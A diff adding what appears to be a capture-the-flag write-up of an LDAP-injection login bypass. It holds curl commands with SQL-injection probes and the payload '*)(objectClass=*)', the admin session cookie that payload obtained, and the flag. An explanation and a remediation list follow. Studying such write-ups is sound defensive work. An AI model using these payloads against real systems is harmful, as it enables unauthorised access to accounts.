@@ -1,0 +1,91 @@
+# Exploit write-up — Authentication bypass via injection (LDAP / SQLi style)
+
+**Target:** `http://54.72.82.22:8803`  
+**Vuln class:** Injection-based authentication bypass (LDAP filter injection / SQLi-style probing)  
+**Impact:** Attacker can bypass login and obtain an authenticated session as `admin` → access admin-only page and flag.
+
+---
+
+## Summary
+
+The login endpoint `/connect` is vulnerable to injection in the credentials fields. By sending crafted input (LDAP filter or SQL-like payloads) the server returned a redirect and set an authenticated `session` cookie for `admin`. Using that cookie grants access to the admin page and reveals the flag.
+
+---
+
+## What I did (commands I ran)
+
+1. **Initial POST attempt with a long payload (failed/no timing):**
+    
+
+`curl -i -s -X POST "http://54.72.82.22:8803/connect" \   -H "Content-Type: application/x-www-form-urlencoded" \   --data-urlencode "username=admin" \   --data-urlencode "password=' OR 1=1 -- $(printf 'a%.0s' $(seq 1 120))"`
+
+Response: `Log in to Directory Failed` (no success).
+
+2. **Timing/boolean injection probes (no delay observed):**
+    
+
+`curl -s -o /dev/null -w "%{time_total}\n" -X POST "http://54.72.82.22:8803/connect" \   -H "Content-Type: application/x-www-form-urlencoded" \   --data-urlencode "username=admin' OR IF(1=1,SLEEP(5),0) -- " \   --data-urlencode "password=$(printf 'a%.0s' $(seq 1 120))" # measured time ~0.42s`
+
+Then:
+
+`curl -s -o /dev/null -w "%{time_total}\n" -X POST "http://54.72.82.22:8803/connect" \   -H "Content-Type: application/x-www-form-urlencoded" \   --data-urlencode "username=admin" \   --data-urlencode "password=' OR SLEEP(5) -- $(printf 'a%.0s' $(seq 1 120))" # measured time ~0.38s`
+
+Conclusion: SQL-style `SLEEP()` payloads did not trigger server-side delay — but this was used as a probe.
+
+3. **LDAP filter injection (working payload) — got authenticated session**
+    
+
+`curl -i -s -X POST "http://54.72.82.22:8803/connect" \   -H "Content-Type: application/x-www-form-urlencoded" \   --data-urlencode "username=admin" \   --data-urlencode "password=*)(objectClass=*)$(printf 'a%.0s' $(seq 1 120))"`
+
+Response:
+
+`HTTP/1.1 302 FOUND Set-Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aN92kA.PY6_sv9CtUd4-GW_pfGy7YsFjlw; HttpOnly; Path=/ Location: /`
+
+4. **Use the session cookie to access `/` (admin page and flag):**
+    
+
+`curl -i -s -H "Cookie: session=eyJ1c2VybmFtZSI6ImFkbWluIn0.aN92kA.PY6_sv9CtUd4-GW_pfGy7YsFjlw" http://54.72.82.22:8803/`
+
+Result (HTML):
+
+`<h2>Welcome, admin</h2> <p>saf_ctf{are_we_cooking_ldap_4or_lunch?} <a href="/config-update">Modify Access ID</a>`
+
+---
+
+## Why it works (technical)
+
+- The `password` input was injected with `*)(objectClass=*)`, which is a canonical LDAP filter trick. If the backend constructs LDAP filters unsafely (e.g., `(&(uid=...)(password=...))` with direct concatenation), injecting `*)(objectClass=*)` can close the original clause and add a universal truth clause `(objectClass=*)`, effectively bypassing the password check.
+    
+- The server then created an authenticated session cookie with `username: admin` — either because the LDAP bind/search returned a match due to the manipulated filter, or because input was interpreted unsafely elsewhere.
+    
+- SQL-style timed probes (`SLEEP`) did not show delay, indicating either the backend isn't using a SQL DB for that check or it's sanitizing those exact patterns; but LDAP payload succeeded.
+    
+
+---
+
+## Remediation (what devs should do)
+
+1. **Never build LDAP filters by string concatenation.** Use safe bind parameters or prepared statements / parameterized LDAP APIs.
+    
+2. **Escape user-supplied input for LDAP** (use libraries that provide proper filter escaping) — e.g., escape `* ( ) \ \0 /` characters per RFC.
+    
+3. **Validate and normalize input server-side.** Enforce strict username/password patterns and length limits.
+    
+4. **Use proper authentication flows:** validate credentials with secure binds or dedicated auth services (do not rely on raw searches that can be manipulated).
+    
+5. **Harden session creation:** only set authenticated sessions after a cryptographically verified auth step; include server-side role lookup (don’t trust user-controlled fields).
+    
+6. **Add rate-limiting, WAF rules, and input-constraint logging.**
+    
+7. **Audit and test for LDAP injection** as part of CI and pentest suites.
+    
+
+---
+
+## Notes / Lessons
+
+- LDAP injection attacks are real and easy to overlook — they often look like `*)(objectClass=*)` or `(|(uid=*)(mail=*))` style payloads.
+    
+- When auth logic depends on constructed filters, a single malformed input can grant full access.
+    
+- Always fetch roles server-side (from DB or directory) after successful authentication; never trust client-provided role or session data.
